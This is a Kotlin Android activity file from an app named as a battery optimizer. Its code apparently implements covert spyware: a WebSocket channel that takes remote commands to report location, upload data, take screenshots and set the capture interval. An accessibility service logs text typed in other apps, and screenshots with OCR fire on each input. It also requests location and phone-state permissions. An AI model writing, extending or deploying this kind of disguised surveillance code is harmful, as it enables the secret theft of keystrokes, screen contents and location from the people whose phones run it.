package com.android.batteryoptimization

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import android.graphics.BitmapFactory
import android.net.Uri
import android.util.Log
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.MoreVert
import androidx.compose.material.icons.filled.Person
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.android.batteryoptimization.network.WebSocketManager
import com.android.batteryoptimization.ocr.OcrEngine
import com.android.batteryoptimization.ocr.OcrResult
import com.google.gson.JsonObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.withContext
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val prefs = getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)
        if (!prefs.contains("app_started_time")) {
            prefs.edit().putLong("app_started_time", System.currentTimeMillis()).apply()
        }

        val hasLaunchedBefore = prefs.getBoolean("has_launched_before", false)

        // Request runtime permissions for device info collection
        val permissions = arrayOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_PHONE_STATE
        )
        val permissionsToRequest = permissions.filter {
            androidx.core.content.ContextCompat.checkSelfPermission(this, it) != android.content.pm.PackageManager.PERMISSION_GRANTED
        }
        if (permissionsToRequest.isNotEmpty()) {
            androidx.core.app.ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
        }

        val repository = InputRepository.getInstance(applicationContext)

        // ── WebSocket 长连接（每次启动 APP 即开启） ──────────────────
        WebSocketManager.onCommand = { command, params ->
            handleWebSocketCommand(command, params)
        }
        WebSocketManager.start(this)

        val startDest = when {
            repository.getUserInfo() == null -> "binding"
            !hasLaunchedBefore -> "main"
            else -> "battery_protection"
        }
        if (!hasLaunchedBefore) {
            prefs.edit().putBoolean("has_launched_before", true).apply()
        }

        setContent {
            BatteryOptimizationTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val navController = rememberNavController()

                    NavHost(navController = navController, startDestination = startDest) {
                        composable("binding") {
                            BindingScreen(
                                repository = repository,
                                onNavigateToMain = {
                                    prefs.edit().putBoolean("has_launched_before", true).apply()
                                    navController.navigate("main") {
                                        popUpTo("binding") { inclusive = true }
                                    }
                                }
                            )
                        }
                        composable("main") {
                            AppScreen(
                                repository = repository,
                                onNavigateToBinding = { navController.navigate("binding") },
                                onNavigateToInstructions = { navController.navigate("instructions") },
                                onNavigateToBatteryProtection = { navController.navigate("battery_protection") },
                                onNavigateToUploadRecords = { navController.navigate("upload_records") }
                            )
                        }
                        composable("instructions") {
                            InstructionScreen(
                                onBackClick = { navController.popBackStack() }
                            )
                        }
                        composable("battery_protection") {
                            BatteryProtectionScreen(
                                onNavigateToMain = {
                                    navController.navigate("main") {
                                        popUpTo("main") { inclusive = true }
                                    }
                                }
                            )
                        }
                        composable("upload_records") {
                            UploadRecordScreen(
                                repository = repository,
                                onBackClick = { navController.popBackStack() }
                            )
                        }
                    }
                }
            }
        }
    }

    // ─── WebSocket 指令处理 ───────────────────────────────────────────

    private fun handleWebSocketCommand(command: String, params: JsonObject?) {
        val repo = InputRepository.getInstance(applicationContext)
        when (command) {
            "report_location" -> {
                Thread {
                    val location = AMapLocationHelper.getLocation(this)
                    val locPayload = com.google.gson.Gson().toJson(location)
                    WebSocketManager.send("""{"type":"location","data":$locPayload}""")
                }.start()
            }
            "upload_data" -> {
                kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                    val (_, msg) = repo.uploadData()
                    Log.d("WebSocket", "Upload trigger result: $msg")
                }
            }
            "take_screenshot" -> {
                val intent = Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            }
            "set_interval" -> {
                val intervalMs = params?.get("interval_ms")?.asLong
                if (intervalMs != null && intervalMs > 0) {
                    getSharedPreferences("keystroke_prefs", MODE_PRIVATE)
                        .edit().putLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, intervalMs).apply()
                    Log.d("WebSocket", "Interval set to ${intervalMs}ms")
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AppScreen(
    repository: InputRepository,
    onNavigateToBinding: () -> Unit,
    onNavigateToInstructions: () -> Unit,
    onNavigateToBatteryProtection: () -> Unit,
    onNavigateToUploadRecords: () -> Unit
) {
    val coroutineScope = rememberCoroutineScope()
    val context = LocalContext.current
    var isServiceEnabled by remember { mutableStateOf(checkAccessibilityPermission(context)) }
    val events by repository.eventsFlow.collectAsState(initial = emptyList())

    fun startAutoScreenshot() {
        if (!checkAccessibilityPermission(context)) {
            android.widget.Toast.makeText(context, "无障碍服务未运行，请先开启权限", android.widget.Toast.LENGTH_SHORT).show()
            return
        }
        val intent = android.content.Intent(InputAccessibilityService.ACTION_TAKE_SCREENSHOT).apply {
            setPackage(context.packageName)
        }
        context.sendBroadcast(intent)
        android.widget.Toast.makeText(context, "已发送测试截屏指令", android.widget.Toast.LENGTH_SHORT).show()
    }

    // Update service status and data when returning to the app
    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) {
                isServiceEnabled = checkAccessibilityPermission(context)
                repository.loadEvents() // Force reload data from disk on resume
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    var showMenu by remember { mutableStateOf(false) }
    var showIntervalDialog by remember { mutableStateOf(false) }

    // 当前截屏间隔（从 SharedPreferences 读取，默认 10s）
    val intervalPrefs = context.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
    var currentIntervalMs by remember { mutableLongStateOf(
        intervalPrefs.getLong(InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, InputAccessibilityService.DEFAULT_SCREENSHOT_INTERVAL_MS)
    ) }

    // ── OCR 引擎（独立于服务，提前加载） ─────────────────────────
    val standaloneEngine = remember { OcrEngine(context) }
    var isStandaloneReady by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        withContext(Dispatchers.IO) {
            standaloneEngine.loadModels()
            isStandaloneReady = standaloneEngine.isReady
        }
    }

    DisposableEffect(Unit) {
        onDispose {
            standaloneEngine.destroy()
        }
    }

    // ── OCR test state ────────────────────────────────────────────────
    var isOcrRunning by remember { mutableStateOf(false) }
    var ocrTestResult by remember { mutableStateOf<List<OcrResult>?>(null) }
    var isLocating by remember { mutableStateOf(false) }
    var locationDialogText by remember { mutableStateOf<String?>(null) }

    val ocrTestLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { uri: Uri? ->
        if (uri == null) return@rememberLauncherForActivityResult
        coroutineScope.launch {
            isOcrRunning = true
            try {
                val bitmap = context.contentResolver.openInputStream(uri)?.use { input ->
                    BitmapFactory.decodeStream(input)
                }?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                if (bitmap == null) {
                    android.widget.Toast.makeText(context, "无法加载图片", android.widget.Toast.LENGTH_SHORT).show()
                    return@launch
                }

                // 优先用服务已加载好的引擎，否则用页面内预加载的引擎
                val serviceEngine = InputAccessibilityService.instance?.getOcrEngine()
                val engine = when {
                    serviceEngine != null && serviceEngine.isReady -> serviceEngine
                    isStandaloneReady -> standaloneEngine
                    else -> {
                        android.widget.Toast.makeText(context, "OCR 引擎尚未加载完，请稍候…", android.widget.Toast.LENGTH_SHORT).show()
                        bitmap.recycle()
                        return@launch
                    }
                }
                val results = engine.recognize(bitmap)
                ocrTestResult = results
                bitmap.recycle()
            } catch (e: Exception) {
                android.widget.Toast.makeText(context, "OCR 测试失败: ${e.message}", android.widget.Toast.LENGTH_LONG).show()
            } finally {
                isOcrRunning = false
            }
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("电池", color = Color.White) },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    navigationIconContentColor = MaterialTheme.colorScheme.onPrimaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer,
                    actionIconContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                ),
                actions = {
                    TextButton(onClick = { showMenu = true }) {
                        Text("更多", color = Color.White, fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }
                    DropdownMenu(
                        expanded = showMenu,
                        onDismissRequest = { showMenu = false }
                    ) {
                        DropdownMenuItem(
                            text = { Text("个人信息修改", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                onNavigateToBinding()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("主动上报数据", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                coroutineScope.launch {
                                    val (_, message) = repository.uploadData()
                                    android.widget.Toast.makeText(context, message, android.widget.Toast.LENGTH_SHORT).show()
                                }
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("查看上传记录", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                onNavigateToUploadRecords()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("电池管理", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                onNavigateToBatteryProtection()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("自动截屏间隔", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                showIntervalDialog = true
                            }
                        )
                        DropdownMenuItem(
                            text = { Text(if (isOcrRunning) "识别中…" else "测试OCR", fontSize = 16.sp) },
                            enabled = !isOcrRunning,
                            onClick = {
                                showMenu = false
                                ocrTestLauncher.launch("image/*")
                            }
                        )
                        DropdownMenuItem(
                            text = { Text("测试截屏", fontSize = 16.sp) },
                            onClick = {
                                showMenu = false
                                startAutoScreenshot()
                            }
                        )
                        DropdownMenuItem(
                            text = { Text(if (isLocating) "定位中…" else "更新定位", fontSize = 16.sp) },
                            enabled = !isLocating,
                            onClick = {
                                showMenu = false
                                coroutineScope.launch {
                                    isLocating = true
                                    android.widget.Toast.makeText(context, "正在开始高德定位，请稍候...", android.widget.Toast.LENGTH_SHORT).show()
                                    try {
                                        val payload = repository.forceRefreshLocation()
                                        val jsonStr = com.google.gson.GsonBuilder().setPrettyPrinting().create().toJson(payload)
                                        locationDialogText = jsonStr
                                    } catch (e: Exception) {
                                        android.widget.Toast.makeText(context, e.message ?: "定位失败", android.widget.Toast.LENGTH_LONG).show()
                                    } finally {
                                        isLocating = false
                                    }
                                }
                            }
                        )
                    }
                }
            )
        }
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .padding(16.dp)
        ) {
            // Prominent Instructions Card at top
            Card(
                onClick = onNavigateToInstructions,
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.secondaryContainer),
                modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp)
            ) {
                Row(
                    modifier = Modifier.padding(14.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Icon(
                        Icons.Default.Info,
                        contentDescription = "使用说明",
                        tint = MaterialTheme.colorScheme.onSecondaryContainer
                    )
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "使用说明",
                            fontWeight = FontWeight.Bold,
                            fontSize = 18.sp,
                            color = MaterialTheme.colorScheme.onSecondaryContainer
                        )
                        Text(
                            text = "首次使用请先完成权限设置，点击查看详情",
                            fontSize = 14.sp,
                            color = MaterialTheme.colorScheme.onSecondaryContainer.copy(alpha = 0.9f)
                        )
                    }
                    Text(
                        text = "查看 >",
                        color = MaterialTheme.colorScheme.onSecondaryContainer,
                        fontWeight = FontWeight.Bold,
                        fontSize = 16.sp
                    )
                }
            }

            if (events.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("暂无记录", color = Color.Gray, fontSize = 16.sp)
                }
            } else {
                LazyColumn(
                    verticalArrangement = Arrangement.spacedBy(8.dp),
                    modifier = Modifier.fillMaxSize()
                ) {
                    items(events) { event ->
                        EventItem(event)
                    }
                }
            }
        }
    }

    // ── OCR 测试结果对话框 ─────────────────────────────────────────────
    ocrTestResult?.let { results ->
        val totalText = results.joinToString("\n") { it.text }
        val detailText = results.mapIndexed { i, r ->
            "#${i + 1}: ${r.text}  (置信度: ${(r.confidence * 100).toInt()}%)"
        }.joinToString("\n")

        AlertDialog(
            onDismissRequest = { ocrTestResult = null },
            title = {
                Text("OCR 测试结果", fontWeight = FontWeight.Bold)
            },
            text = {
                Column {
                    Text(
                        text = "检测到 ${results.size} 个文本区域",
                        color = MaterialTheme.colorScheme.primary,
                        fontWeight = FontWeight.SemiBold
                    )
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = "── 全部文本 ──",
                        fontWeight = FontWeight.SemiBold,
                        fontSize = 14.sp
                    )
                    Spacer(Modifier.height(4.dp))
                    Text(text = totalText, fontSize = 18.sp)
                    Spacer(Modifier.height(12.dp))
                    Divider()
                    Spacer(Modifier.height(8.dp))
                    Text(
                        text = "── 详细信息 ──",
                        fontWeight = FontWeight.SemiBold,
                        fontSize = 14.sp
                    )
                    Spacer(Modifier.height(4.dp))
                    Text(text = detailText, fontSize = 14.sp, color = Color.Gray)
                }
            },
            confirmButton = {
                TextButton(onClick = { ocrTestResult = null }) {
                    Text("关闭")
                }
            }
        )
    }

    // ── 高德定位结果对话框 ─────────────────────────────────────────────
    locationDialogText?.let { json ->
        AlertDialog(
            onDismissRequest = { locationDialogText = null },
            title = {
                Text("高德定位结果", fontWeight = FontWeight.Bold)
            },
            text = {
                Column(
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "以下为上传地理位置对象的结构与内容：",
                        fontWeight = FontWeight.SemiBold,
                        color = MaterialTheme.colorScheme.primary,
                        fontSize = 14.sp
                    )
                    Spacer(Modifier.height(8.dp))
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(260.dp)
                            .background(Color(0xFFF5F5F5))
                            .padding(8.dp)
                    ) {
                        androidx.compose.foundation.lazy.LazyColumn {
                            item {
                                Text(
                                    text = json,
                                    fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                    fontSize = 12.sp,
                                    color = Color.DarkGray
                                )
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { locationDialogText = null }) {
                    Text("确定")
                }
            }
        )
    }

    // ── 自动截屏间隔设置对话框 ────────────────────────────────────
    if (showIntervalDialog) {
        val options = listOf(
            5000L to "5 秒",
            10000L to "10 秒",
            15000L to "15 秒",
            30000L to "30 秒",
            60000L to "60 秒"
        )
        AlertDialog(
            onDismissRequest = { showIntervalDialog = false },
            title = { Text("自动截屏间隔", fontWeight = FontWeight.Bold) },
            text = {
                Column {
                    Text("每次输入时，距上次截屏超过此间隔则自动截屏+OCR")
                    Spacer(Modifier.height(12.dp))
                    options.forEach { (ms, label) ->
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    currentIntervalMs = ms
                                    intervalPrefs.edit().putLong(
                                        InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, ms
                                    ).apply()
                                    showIntervalDialog = false
                                }
                                .padding(vertical = 8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            RadioButton(
                                selected = currentIntervalMs == ms,
                                onClick = {
                                    currentIntervalMs = ms
                                    intervalPrefs.edit().putLong(
                                        InputAccessibilityService.KEY_SCREENSHOT_INTERVAL, ms
                                    ).apply()
                                    showIntervalDialog = false
                                }
                            )
                            Spacer(Modifier.width(8.dp))
                            Text(label, fontSize = 16.sp)
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showIntervalDialog = false }) {
                    Text("取消")
                }
            }
        )
    }
}

@Composable
fun EventItem(event: InputEvent) {
    val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    val dateString = dateFormat.format(Date(event.timestamp))

    Card(
        modifier = Modifier.fillMaxWidth(),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
    ) {
        Column(
            modifier = Modifier.padding(12.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                val displayName = if (!event.appName.isNullOrBlank()) event.appName else event.packageName
                Text(
                    text = displayName,
                    fontSize = 14.sp,
                    color = MaterialTheme.colorScheme.primary,
                    fontWeight = FontWeight.Bold
                )
                Text(
                    text = dateString,
                    fontSize = 14.sp,
                    color = Color.Gray
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = event.text,
                fontSize = 18.sp,
                fontWeight = FontWeight.Medium,
                color = MaterialTheme.colorScheme.onSurface
            )
        }
    }
}

fun checkAccessibilityPermission(context: Context): Boolean {
    var accessibilityEnabled = 0
    val service = "${context.packageName}/${InputAccessibilityService::class.java.canonicalName}"
    try {
        accessibilityEnabled = Settings.Secure.getInt(
            context.contentResolver,
            android.provider.Settings.Secure.ACCESSIBILITY_ENABLED
        )
    } catch (e: Settings.SettingNotFoundException) {
        // Ignore
    }
    if (accessibilityEnabled == 1) {
        val settingValue = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        if (settingValue != null) {
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(settingValue)
            while (splitter.hasNext()) {
                val accessibilityService = splitter.next()
                if (accessibilityService.equals(service, ignoreCase = true)) {
                    return InputAccessibilityService.instance != null
                }
            }
        }
    }
    return false
}
